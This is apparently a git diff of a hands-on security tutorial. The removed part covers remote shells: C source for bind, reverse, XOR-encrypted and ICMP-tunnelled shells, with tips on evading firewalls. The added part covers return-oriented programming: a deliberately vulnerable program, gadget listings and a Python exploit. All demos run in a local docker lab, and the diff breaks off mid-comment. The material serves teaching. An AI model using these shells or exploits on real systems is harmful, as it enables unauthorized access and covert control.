@@ -1,1013 +1,337 @@
-# Remote shell
+# Return-Oriented Programming (ROP)
 
-From a security point of view, a remote shell is usually part of a shellcode to enable unauthorized remote access to a system. This tutorial is heavily based in [1], [2], [3] and [4].
+Return-Oriented Programming or ROP for short combines a large number of short instruction sequences to build *gadgets* that  allow arbitrary computation. From [3]:
+
+> Return Oriented Programming (ROP) is a powerful technique used to counter common exploit prevention strategies. In particular, ROP is useful for circumventing Address Space Layout Randomization (ASLR) and NX/DEP. When using ROP, an attacker uses his/her control over the stack right before the return from a function to direct code execution to some other location in the program. Except on very hardened binaries, attackers can easily find a portion of code that is located in a fixed location (circumventing ASLR) and which is executable (circumventing DEP). Furthermore, it is relatively straightforward to chain several payloads to achieve (almost) arbitrary code execution.
 
 ----
 
 **Note**: as in previous tutorials, there's a docker container that facilitates reproducing the work of this tutorial. The container can be built with:
 ```bash
-docker build -t basic_cybersecurity5:latest .
+docker build -t basic_cybersecurity4:latest .
 ```
 and runned with:
 ```bash
-docker run --privileged -it basic_cybersecurity5:latest
+docker run --privileged -it basic_cybersecurity4:latest
 ```
 
 ----
 
-The content used for this tutorial will be touching into remote shells.
+The content used for this tutorial will be heavily relying on [3]. The tutorial's objective is to learn about the basic concept of return-oriented programming (ROP).
 
-According to [1], there are basically two ways to get remote shell access:
+From [9]:
 
-- **Direct Remote Shells**. A direct remote shell behaves as a server. It works like a ssh or telnet server. The remote user/attacker, connects to a specific port on the target machine and gets automatically access to a shell.
-- **Reverse Remote Shells**. These ones work the other way around. The application running on the target machine connects back (calls back home) to a specific server and port on a machine that belongs to the user/attacker.
+> ##### NX/DEP
+>DEP stands for data execution prevention, this technique marks areas of memory as non executable. Usually the stack and heap are marked as non executable thus preventing attacker from executing code residing in these regions of memory.
 
-The *Reverse Shell* method has some advantages:
+> ##### ASLR
+>ASLR stands for Address Space Layer Randomization. This technique randomizes address of memory where shared libraries , stack and heap are maapped at. This prevent attacker from predicting where to take EIP , since attacker does not knows address of his malicious payload.
 
-- Firewalls usually block incoming connections, but they allow outgoing connection in order to provide Internet access to the machine’s users.
-- The user/attacker does not need to know the IP of the machine running the remote shell, but s/he needs to own a system with a fixed IP, to let the target machine call home.
-- Usually there are many outgoing connections in a machine and only a few servers (if any) running on it. This makes detection a little bit harder, specially if the shell connects back to something listening on port 80…
+> ##### Stack Canaries
+>In this technique compiler places a randomized guard value after stack frame’s local variables and before the saved return address. This guard is checked before function returns if it’s not same then program exits.
 
-Let's write a client and a server that will allow us to explore both  methods:
 
-### The client
+From `ret-to-libc` to ROP
+
+From [3],
+> With ROP, it is possible to do far more powerful things than calling a single function. In fact, we can use it to run arbitrary code6 rather than just calling functions we have available to us. We do this by returning to gadgets, which are short sequences of instructions ending in a ret.
+>
+> We can also use ROP to chain function calls: rather than a dummy return address, we use a pop; ret gadget to move the stack above the arguments to the first function. Since we are just using the pop; ret gadget to adjust the stack, we don't care what register it pops into (the value will be ignored anyways). As an example, we'll exploit the following binary
+
 ```C
-#include <stdio.h>
-#include <stdlib.h>  
-#include <unistd.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
+char string[100];
 
-int
-client_init (char *ip, int port)
-{
-  int                s;
-  struct sockaddr_in serv;
+void exec_string() {
+    system(string);
+}
 
-  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
-    {
-      perror ("socket:");
-      exit (EXIT_FAILURE);
+void add_bin(int magic) {
+    if (magic == 0xdeadbeef) {
+        strcat(string, "/bin");
     }
+}
 
-  serv.sin_family = AF_INET;
-  serv.sin_port = htons(port);
-  serv.sin_addr.s_addr = inet_addr(ip);
-
-  if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0)
-    {
-      perror("connect:");
-      exit (EXIT_FAILURE);
+void add_sh(int magic1, int magic2) {
+    if (magic1 == 0xcafebabe && magic2 == 0x0badf00d) {
+        strcat(string, "/sh");
     }
+}
 
-  return s;
+void vulnerable_function(char* string) {
+    char buffer[100];
+    strcpy(buffer, string);
+}
+
+int main(int argc, char** argv) {
+    string[0] = 0;
+    vulnerable_function(argv[1]);
+    return 0;
 }
 ```
 
-The function receives as parameters an IP address to connect to and a port. Then it creates a TCP socket (SOCK_STREAM) and fills in the data for connecting. The connection is effectively established after a successful execution of connect. In case of any error (creating the socket or connection) we just stop the application.
+We can see that the goal is to call `add_bin`, then `add_sh`, then `exec_string`. When we call add_bin, the stack must look like:
 
-This function will allow us to implement a reverse remote shell. Client continues as:
-
-```C
-int
-start_shell (int s)
-{
-  char *name[3] ;
-
-  dup2 (s, 0);
-  dup2 (s, 1);
-  dup2 (s, 2);
-
-  name[0] = "/bin/sh";
-  name[1] = "-i";
-  name[2] = NULL;
-  execv (name[0], name );
-  exit (1);
-
-  return 0;
-}
+```
+high | <argument>       |
+low  | <return address> |
 ```
 
-the function `start_shell` is pretty simple. It makes use of two system calls dup2 and execv. The first one duplicates a given file descriptor. In this case, the three calls at the beginning of the function, assigns the file descriptor received as parameter to the Standard Input (file descriptor 0), Standard Output (file descriptor 1) and Standard Error (file descriptor 3).
+In our case, we want the argument to be `0xdeadbeef` we want the return address to be a pop; ret gadget. This will remove `0xdeadbeef` from the stack and return to the next gadget on the stack. We thus have a gadget to call `add_bin(0xdeadbeef)` that looks like:
+```
+high  | 0xdeadbeef            |
+      | <address of pop; ret> |
+      | <address of add_bin>  |
+```
+(*this is a gadget*)
 
-So, if the file descriptor we pass as a parameter is one of the sockets created with our previous client and server functions, we are effectively sending and receiving data through the network every time we write data to the console and we read data from stdin.
+Since `add_sh(0xcafebabe, 0x0badf00d)` use two arguments, we need a `pop; pop; ret`:
+```
+high  | 0x0badf00d                 |
+      | 0xcafebabe                 |
+      | <address of pop; pop; ret> |
+      | <address of add_sh>        |
+```
+(*note how gadgets get chained with those ones executing first in the lowest memory addresses (closer to the stack pointer)*)
 
-Now we just execute a shell with the -i flag (interactive mode). The execv system call will substitute the current process (whose stdin,stdout and stderr are associated to a network connection) by the one passed as parameter.
+Putting all of it together:
 
-And finally, main, self-explanatory:
-
-```C
-int
-main (int argc, char *argv[])
-{
-  /* FIXME: Check command-line arguments */
-  start_shell (client_init (argv[1], atoi(argv[2])));
-  return 0;
-}
+```
+high    | <address of exec_string>     |
+        | 0x0badf00d                   |
+        | 0xcafebabe                   |
+        | <address of pop; pop; ret>   |
+        | <address of add_sh>          |
+        | 0xdeadbeef                   |
+        | <address of pop; ret>        |
+        | <address of add_bin>         |
+        | 0x42424242 (fake saved %ebp) |
+        | 0x41414141 ...               |
+        |   ... (0x6c bytes of 'A's)   |
+        |   ... 0x41414141             |
 ```
 
-### The server
-
-```C
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-
-int
-server_init (int port)
-{
-  int                s, s1;
-  socklen_t          clen;
-  struct sockaddr_in serv, client;
-
-  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
-    {
-      perror ("socket:");
-      exit (EXIT_FAILURE);
-    }
-
-  serv.sin_family = AF_INET;
-  serv.sin_port = htons(port);
-  serv.sin_addr.s_addr = htonl(INADDR_ANY);
-
-  if ((bind (s, (struct sockaddr *)&serv,
-	     sizeof(struct sockaddr_in))) < 0)
-    {
-      perror ("bind:");
-      exit (EXIT_FAILURE);
-    }
-  if ((listen (s, 10)) < 0)
-    {
-      perror ("listen:");
-      exit (EXIT_FAILURE);
-    }
-  clen = sizeof(struct sockaddr_in);
-  if ((s1 = accept (s, (struct sockaddr *) &client,
-		    &clen)) < 0)
-    {
-      perror ("accept:");
-      exit (EXIT_FAILURE);
-    }
-
-  return s1;
-
-}
+With this diagram in mind, let's figure out the addresses. First the functions:
 ```
-the beginning of the function is practically the same that for the client code. It creates a socket, fills in the network data, but instead of trying to connect to a remote server, it binds the socket to a specific port. Note that the address passed to bind is the constant INADDR_ANY. This is actually IP 0.0.0.0 and it means that the socket will be listening on all interfaces.
-
-The bind system call does not really make the socket a listening socket (you can actually call bind on a client socket). It is the listen system call the one that makes the socket a server socket. The second parameter passed to listen is the backlog. Basically it indicates how many connections will be queued to be accepted before the server starts rejecting connections. In our case it just do not really matter.
-
-At this point, our server is setup and we can accept connections. The call to the accept system call will make our server wait for an incoming connection. Whenever it arrives a new socket will be created to interchange data with the new client.
-
-Similar to the client, we also include `start_shell` and `main` as follows:
-
-```C
-int
-start_shell (int s)
-{
-  char *name[3] ;
-
-  dup2 (s, 0);
-  dup2 (s, 1);
-  dup2 (s, 2);
-
-  name[0] = "/bin/sh";
-  name[1] = "-i";
-  name[2] = NULL;
-  execv (name[0], name );
-  exit (1);
-
-  return 0;
-}
-
-int
-main (int argc, char *argv[])
-{
-  /* FIXME: Check command-line arguments */
-  start_shell (server_init (atoi(argv[1])));
-  return 0;
-}
+>>> p &exec_string
+$1 = (void (*)()) 0x804844d <exec_string>
+>>> p &add_bin
+$2 = (void (*)(int)) 0x8048461 <add_bin>
+>>> p &add_sh
+$3 = (void (*)(int, int)) 0x804849c <add_sh>
 ```
-
-### Direct Remote Shell
+To obtain the gadgets and identify the right one. To do so we could use `dumprop` from PEDA [11], or `rp++` [12]:
+```
+A total of 162 gadgets found.
+0x0804870b: adc al, 0x41 ; ret  ;  (1 found)
+0x08048497: add al, 0x00 ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x0804830a: add al, 0x08 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x0804A00C] ;  (1 found)
+0x08048418: add al, 0x08 ; add ecx, ecx ; rep ret  ;  (1 found)
+0x080483b4: add al, 0x08 ; call eax ;  (1 found)
+0x0804843d: add al, 0x08 ; call eax ;  (1 found)
+0x080483f1: add al, 0x08 ; call edx ;  (1 found)
+0x08048304: add al, 0x08 ; jmp dword [0x0804A008] ;  (1 found)
+0x080483b0: add al, 0x24 ; and al, 0xA0 ; add al, 0x08 ; call eax ;  (1 found)
+0x080483ed: add al, 0x24 ; and al, 0xA0 ; add al, 0x08 ; call edx ;  (1 found)
+0x08048302: add al, 0xA0 ; add al, 0x08 ; jmp dword [0x0804A008] ;  (1 found)
+0x080482ff: add bh, bh ; xor eax, 0x0804A004 ; jmp dword [0x0804A008] ;  (1 found)
+0x080482fd: add byte [eax], al ; add bh, bh ; xor eax, 0x0804A004 ; jmp dword [0x0804A008] ;  (1 found)
+0x0804830c: add byte [eax], al ; add byte [eax], al ; jmp dword [0x0804A00C] ;  (1 found)
+0x0804851a: add byte [eax], al ; add byte [eax], al ; leave  ; ret  ;  (1 found)
+...
+```
+In particular we filter by `pop`:
 ```bash
-# terminal 1
-docker run --privileged -it basic_cybersecurity5:latest
-root@7e837bd2c6b2:~# ./server 5000
+root@74929f891a04:~# ./rp++ -f rop6 -r 3 | grep pop
+0x08048497: add al, 0x00 ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x080482f0: add byte [eax], al ; add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
+0x080485a1: add byte [eax], al ; add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
+0x0804859d: add ebx, 0x00001A63 ; add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
+0x080482f2: add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
+0x080485a3: add esp, 0x08 ; pop ebx ; ret  ;  (1 found)
+0x08048578: fild word [ebx+0x5E5B1CC4] ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x08048493: imul ebp, dword [esi-0x3A], 0x5F000440 ; pop ebp ; ret  ;  (1 found)
+0x080482f3: les ecx,  [eax] ; pop ebx ; ret  ;  (1 found)
+0x080485a4: les ecx,  [eax] ; pop ebx ; ret  ;  (1 found)
+0x08048495: mov byte [eax+0x04], 0x00000000 ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x080484d3: mov dword [eax], 0x0068732F ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x0804849a: pop ebp ; ret  ;  (1 found)
+0x080484da: pop ebp ; ret  ;  (1 found)
+0x0804857f: pop ebp ; ret  ;  (1 found)
+0x080482f5: pop ebx ; ret  ;  (1 found)
+0x080485a6: pop ebx ; ret  ;  (1 found)
+0x08048499: pop edi ; pop ebp ; ret  ;  (1 found)
+0x080484d9: pop edi ; pop ebp ; ret  ;  (1 found)
+0x0804857e: pop edi ; pop ebp ; ret  ;  (1 found)
+0x0804857d: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
+```
+From the content above, we pick `0x080485a6` (pop; ret) and `0x08048499` (pop; pop; ret).
 
+Alternative, using `objdump -d rop6`, we can find most of this information visually.
 
-# terminal 2
-# we figure out the running docker container's ID
-docker ps
-CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS               NAMES
-7e837bd2c6b2        basic_cybersecurity5:latest   "bash"              24 seconds ago      Up 23 seconds                           ecstatic_golick
-# get a shell into the container
-$ docker exec -it 7e837bd2c6b2 bash
-# get a direct remote shell
-root@7e837bd2c6b2:~# nc 127.0.0.1 5000
+With all this information, we go ahead and build a script that puts it all together:
+```Python
+#!/usr/bin/python
+
+import os
+import struct
+
+# These values were found with `objdump -d a.out`.
+pop_ret = 0x080485a6
+pop_pop_ret = 0x08048499
+exec_string = 0x804844d
+add_bin = 0x8048461
+add_sh = 0x804849c
+
+# First, the buffer overflow.
+payload =  "A"*0x6c
+payload += "BBBB"
+
+# The add_bin(0xdeadbeef) gadget.
+payload += struct.pack("I", add_bin)
+payload += struct.pack("I", pop_ret)
+payload += struct.pack("I", 0xdeadbeef)
+
+# The add_sh(0xcafebabe, 0x0badf00d) gadget.
+payload += struct.pack("I", add_sh)
+payload += struct.pack("I", pop_pop_ret)
+payload += struct.pack("I", 0xcafebabe)
+payload += struct.pack("I", 0xbadf00d)
+
+# Our final destination.
+payload += struct.pack("I", exec_string)
+
+print(payload)
+
+os.system("./rop6 \"%s\"" % payload)
+```
+
+Executing this:
+```bash
+root@5daa0de3a6d9:~# python rop6_exploit.py
+?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBa?ﾭޜ?????
+ M?
 # ls
-checksec.sh
-client
-client.c
-rp++
-server
-server.c
+checksec.sh  rop1    rop1_noprotection	rop2.c		   rop3    rop4    rop5    rop6    rop6_exploit.py
+peda	     rop1.c  rop2		rop2_noprotection  rop3.c  rop4.c  rop5.c  rop6.c  rp++
 # uname -a
-Linux 7e837bd2c6b2 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+Linux 5daa0de3a6d9 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-or running server in the docker container and client in the host machine:
+Let's analyze the memory in more detail to understand the script's behavior:
 ```
-# terminal 1
-docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
-root@81bffa48f8a3:~# ./server 5000
-
-
-# terminal 2
-nc localhost 5000
-$ nc localhost 5000
-# uname -a
-Linux 81bffa48f8a3 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
-#
+─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+            esp
+0xffffd6d0 [ec d6 ff ff] 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
+0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
+0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+                                    ebp           ret
+0xffffd750 41 41 41 41 41 41 41 41 [42 42 42 42] [61 84 04 08] AAAAAAAABBBBa...
+0xffffd760 a6 85 04 08 ef be ad de 9c 84 04 08 99 84 04 08 ................
+0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
+0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
+0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
+0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
+0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
+0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...
 ```
-Note that we had to map port 5000 between docker and the host OS.
+Originally and after copying the argument (generated from the python script) to the stack,
+the *base pointer* `ebp` has the value `0x42424242` (or "BBBB") which will lead to a segmentation error
+when the stack returns. Note that we've rewritten the return address with the address of `add_bin`, thereby, after we reach the `ret` instruction we'll head there.
 
-### Reverse Remote Shells
-```bash
-# terminal 1
-$ docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
-root@812b61f0f7cc:~# nc -l -p 5000
-
-# terminal 2
-docker ps
-CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES
-812b61f0f7cc        basic_cybersecurity5:latest   "bash"              3 seconds ago       Up 6 seconds        0.0.0.0:5000->5000/tcp   reverent_haibt
-docker exec -it 812b61f0f7cc bash
-root@812b61f0f7cc:~#
-root@812b61f0f7cc:~# ./client 127.0.0.1 5000
-
-# terminal 1
-uname -a
-Linux 812b61f0f7cc 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+The first few instructions of function `add_bin` are as follows:
 ```
-
-### Encrypted remote shell
-
-Following from previous code and taking inspiration from [4], we will extend the previous example to encrypt the data stream.
-
-To begin with, as nicely explained at [4]:
-
->In order to crypt our communication, we need something in front of the shell that gets the data from/to the network and crypts/decrypts it. This can be done in many different ways.
->
->This time we have choose to launch the shell as a separated child process and use a socketpair to transfer the data received/sent through the network to the shell process. The father process will then crypt and decrypt the data going into/coming from the network/shell. This may look a bit confusing at first glance, but that is just because of my writing :).
->
->A socketpair is just a pair of sockets that are immediately connected. Something like running the client and server code in just one system call. Conceptually they behave as a pipe but the main difference is that the sockets are bidirectional in opposition to a pipe where one of the file descriptors is read only and the other one is write only.
->
->`socketpairs` are a convenient IPC (InterProcess Communication) mechanism and fits pretty well in our network oriented use case... because they are sockets after all.
-
-Code for crypting and de-crypting the communications over a remote shell is presented (and commented) below:
-```C
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-// Creates a socket, fills in the network data and binds the socket
-// to a specific port given as a parameter.
-//
-// Note that the address passed to bind is the constant INADDR_ANY.
-// This is actually IP 0.0.0.0 and it means that the socket will be
-// listening on all interfaces.
-//
-// Returns file descriptor of the accepted connection.
-int
-server_init (int port)
-{
-        int s, s1;
-        socklen_t clen;
-        struct sockaddr_in serv, client;
-
-        if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
-        {
-                perror ("socket:");
-                exit (EXIT_FAILURE);
-        }
-
-        serv.sin_family = AF_INET;
-        serv.sin_port = htons(port);
-        serv.sin_addr.s_addr = htonl(INADDR_ANY);
-
-        if ((bind (s, (struct sockaddr *)&serv,
-                   sizeof(struct sockaddr_in))) < 0)
-        {
-                perror ("bind:");
-                exit (EXIT_FAILURE);
-        }
-
-        if ((listen (s, 10)) < 0)
-        {
-                perror ("listen:");
-                exit (EXIT_FAILURE);
-        }
-        clen = sizeof(struct sockaddr_in);
-        if ((s1 = accept (s, (struct sockaddr *) &client,
-                          &clen)) < 0)
-        {
-                perror ("accept:");
-                exit (EXIT_FAILURE);
-        }
-        return s1;
-
-}
-
-// Receives as parameters an IP address to connect to
-// and a port. Then it creates a TCP socket (SOCK_STREAM)
-// and fills in the data for connecting. The connection
-// is effectively established after a successful execution
-// of connect. In case of any error (creating the socket or
-// connection) we just stop the application.
-//
-// Returns the file descriptor from where to send/receive
-// client data
-int
-client_init (char *ip, int port)
-{
-        int s;
-        struct sockaddr_in serv;
-
-        printf ("+ Connecting to %s:%d\n", ip, port);
-
-        if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
-        {
-                perror ("socket:");
-                exit (EXIT_FAILURE);
-        }
-
-        serv.sin_family = AF_INET;
-        serv.sin_port = htons(port);
-        serv.sin_addr.s_addr = inet_addr(ip);
-
-        if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0)
-        {
-                perror("connect:");
-                exit (EXIT_FAILURE);
-        }
-
-        return s;
-}
-
-
-// Function that allow us to implement a reverse remote shell.
-//
-// It makes use of two system calls dup2 and execv. The first one
-// duplicates a given file descriptor. In this case, the three
-// calls at the beginning of the function, assigns the file
-// descriptor received as parameter to the Standard Input (file
-//  descriptor 0), Standard Output (file descriptor 1) and
-// Standard Error (file descriptor 3).
-//
-// If the file descriptor we pass as a parameter is one of the
-// sockets created with our previous client and server functions,
-// we are effectively sending and receiving data through the
-// network every time we write data to the console and we read data
-// from stdin.
-int
-start_shell (int s)
-{
-        char *name[3];
-
-        printf ("+ Starting shell\n");
-        dup2 (s, 0);
-        dup2 (s, 1);
-        dup2 (s, 2);
-
-        name[0] = "/bin/sh";
-        name[1] = "-i";
-        name[2] = NULL;
-        execv (name[0], name );
-        exit (1);
-
-        return 0;
-}
-
-
-// This function decode the information received from the network sends
-// it to the shell using the counterpart socket (from the socketpair)
-// system call.
-//
-// At the same time, whenever the shell produces some output, this function
-// will read that data, crypt it and send it over the network.
-//
-// Receives as parameters two file descriptors, one representing the
-// socketpair end for communications with the shell (s1) and the
-// other for networking (s).
-void
-async_read (int s, int s1)
-{
-        fd_set rfds;
-        struct timeval tv;
-        int max = s > s1 ? s : s1;
-        int len, r;
-        char buffer[1024];
-
-        max++;
-        while (1)
-        {
-                // macros to initialize the file descriptor set
-                FD_ZERO(&rfds);
-                FD_SET(s,&rfds);
-                FD_SET(s1,&rfds);
-
-                /* Time out. */
-                // set to 1 second
-                // microseconds resolution
-                tv.tv_sec = 1;
-                tv.tv_usec = 0;
-
-                // standard select loop for a network application.
-                if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
-                {
-                        perror ("select:");
-                        exit (EXIT_FAILURE);
-                }
-                else if (r > 0) /* If there is data to process */
-                {
-
-                  // The memfrob function does a XOR crypting with
-                  // key (42). The greatest thing about XOR crypting is that the
-                  // same function can be used for crypt and decrypt. Other than
-                  // that, with a 1 byte long key (42 in this case) it is pretty
-                  // useless.
-                        if (FD_ISSET(s, &rfds))
-                        {
-                                // get data in our network socket, we just read the data,
-                                // decrypt it and resend it to our shell.
-                                memset (buffer, 0, 1024);
-                                if ((len = read (s, buffer, 1024)) <= 0) exit (1);
-                                memfrob (buffer, len);
-
-                                write (s1, buffer, len);
-                        }
-                        if (FD_ISSET(s1, &rfds))
-                        {
-                                // get data from our shell, we read it, we crypt it and
-                                // we send it back to the network client.
-                                memset (buffer, 0, 1024);
-                                if ((len = read (s1, buffer, 1024)) <= 0) exit (1);
-
-                                memfrob (buffer, len);
-                                write (s, buffer, len);
-                        }
-                }
-        }
-}
-
-// Set up the socket pair and create a new process (using fork)
-//
-// Function creates a socket pair using the syscall socketpair).
-// The fork system call creates a new process as an identical image
-// that make use of the sp socketpair to communicate both processes.
-//
-// Instead of feeding data into our shell directly from the network,
-// function is used to send/receive data using the counterpart socket
-// provided by socketpair.
-void
-secure_shell (int s)
-{
-        pid_t pid;
-        int sp[2];
-
-        /* Create a socketpair to talk to the child process */
-        if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
-        {
-                perror ("socketpair:");
-                exit (1);
-        }
-
-        /* Fork a shell */
-        if ((pid = fork ()) < 0)
-        {
-                perror ("fork:");
-                exit (1);
-        }
-        else
-        if (!pid) /* Child Process */
-        {
-                close (sp[1]);
-                close (s);
-
-                start_shell (sp[0]);
-                /* This function will never return */
-        }
-
-        /* At this point we are the father process */
-        close (sp[0]);
-
-        printf ("+ Starting async read loop\n");
-        async_read (s, sp[1]);
-
-}
-
-int
-main (int argc, char *argv[])
-{
-        /* FIXME: Check command-line arguments */
-        if (argv[1][0] == 'c')
-                secure_shell (client_init (argv[2], atoi(argv[3])));
-        else if (argv[1][0] == 's')
-                secure_shell (server_init (atoi(argv[2])));
-        else if (argv[1][0] == 'a')
-                async_read (client_init (argv[2], atoi(argv[3])), 0);
-        else if (argv[1][0] == 'b')
-                async_read (server_init (atoi(argv[2])), 0);
-
-
-        return 0;
-}
+0x08048461 add_bin+0 push   %ebp
+0x08048462 add_bin+1 mov    %esp,%ebp
+0x08048464 add_bin+3 push   %edi
+0x08048465 add_bin+4 cmpl   $0xdeadbeef,0x8(%ebp)
 ```
-
-Let's try it out:
-
-```bash
-# In one terminal
-docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
-root@ab97f27ecde6:~# ./crypt_shell s 5000
-
-# In the other terminal
-$ docker ps
-CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES
-ab97f27ecde6        basic_cybersecurity5:latest   "bash"              2 minutes ago       Up 2 minutes        0.0.0.0:5000->5000/tcp   pedantic_lamarr
-victor at Victors-MacBook in ~/basic_cybersecurity/tutorial5 on master*
-$ docker exec -it ab97f27ecde6 bash
-root@ab97f27ecde6:~# ./crypt_shell a 127.0.0.1 5000
-+ Connecting to 127.0.0.1:5000
-# uname -a
-Linux ab97f27ecde6 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
-#
+Leaving the stack as:
 ```
-
-### Remote shell through ICMP
-
-The following content is based on [3]. The idea is to use an unusual communication channel with our remote shell. In particular, we'll be using ICMP packets to transfer the shell data and commands between the two machines. The method described here generates an unusual ICMP traffic that may fire some alarms however it all depends on the scenario.
-
-The technique is actually pretty simple (and old). In a nutshell, we aim to:
-
-- Change our client/server sockets into a RAW socket
-- Write a sniffer to capture ICMP traffic
-- Write a packet injector to send ICMP messages
-
-The complete source code has been commented for readibility and is presented below. It should be self-explanatory:
-```C
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <unistd.h>
-#include <linux/ip.h>
-#include <linux/icmp.h>
-
-/* Helper functions */
-#define BUF_SIZE 1024
-
-// two function pointers that we can easily change (at run-time)
-// to point to different implementation.
-static int (*net_read)(int fd, void *buf, size_t count);
-static int (*net_write) (int fd, void *buf, size_t count);
-
-static int icmp_type = ICMP_ECHOREPLY;;
-static int id = 12345;
-
-// This struc represents a packet as it is read from
-// a IPPROTO_ICMP RAW socket. The RAW socket will return
-// an IP header, then a ICMP header followed by the data.
-//
-// In this example, and again, to keep things simple,
-// we are using a fixed packet format. Our data packet
-// is composed of an integer indicating the size of the
-// data in the packet, plus a data block with a maximum
-// size of BUF_SIZE. So our packets will look like this:
-//
-// +-----------+-------------+-------------------+
-// | IP Header | ICMP Header | Len  | shell data |
-// |           +-------------+-------------------+
-// +---------------------------------------------+
-typedef struct
-{
-        struct iphdr ip;
-        struct icmphdr icmp;
-        int len;
-        char data[BUF_SIZE];     /* Data */
-} PKT;
-
-// struct to write into the network our shell data within
-// ICMP packets.
-//
-// This represents the packet we will be sending. By default,
-// sockets RAW does not give us access to the IP header. This
-// is convenient as we do not have to care about feeding IP
-// addressed or calculating checksums for the whole IP packet.
-// It can indeed be forced, but in this case it is just not
-// convenient. That is why our transmission packet does not
-// have an IP header. If you need to access the IP header,
-// you can do it using the IP_HDRINCL socket option
-// (man 7 raw for more info).
-typedef struct {
-        struct icmphdr icmp;
-        int len;
-} PKT_TX;
-
-static struct sockaddr_in dest;
-
-// Creates a RAW socket. The same RAW socket will be
-// used to write our sniffer (to capture the ICMP
-// traffic) and also to inject our ICMP requests with
-// our own data.
-//
-// Two parameters, the first one is the destination IP of
-// our ICMP packets. The second is the protocol, by
-// default we have selected ICMP.
-//
-//
-// Returns a file descriptor representing the raw socket
-int
-raw_init (char *ip, int proto)
-{
-        int s;
-
-        if ((s = socket (AF_INET, SOCK_RAW, proto)) < 0)
-        {
-                perror ("socket:");
-                exit (1);
-        }
-
-        dest.sin_family = AF_INET;
-        inet_aton (ip, &dest.sin_addr);
-        fprintf (stderr, "+ Raw to '%s' (type : %d)\n", ip, icmp_type);
-
-        return s;
-}
-
-/* ICMP */
-u_short
-icmp_cksum (u_char *addr, int len)
-{
-        register int sum = 0;
-        u_short answer = 0;
-        u_short *wp;
-
-        for (wp = (u_short*)addr; len > 1; wp++, len -= 2)
-                sum += *wp;
-
-        /* Take in an odd byte if present */
-        if (len == 1)
-        {
-                *(u_char *)&answer = *(u_char*)wp;
-                sum += answer;
-        }
-
-        sum = (sum >> 16) + (sum & 0xffff); /* add high 16 to low 16 */
-        sum += (sum >> 16);             /* add carry */
-        answer = ~sum;                  /* truncate to 16 bits */
-
-        return answer;
-}
-
-// packet sniffer,
-// As packets used in this example have a fixed size, we can
-// just read then in one shot (note that this may have issues
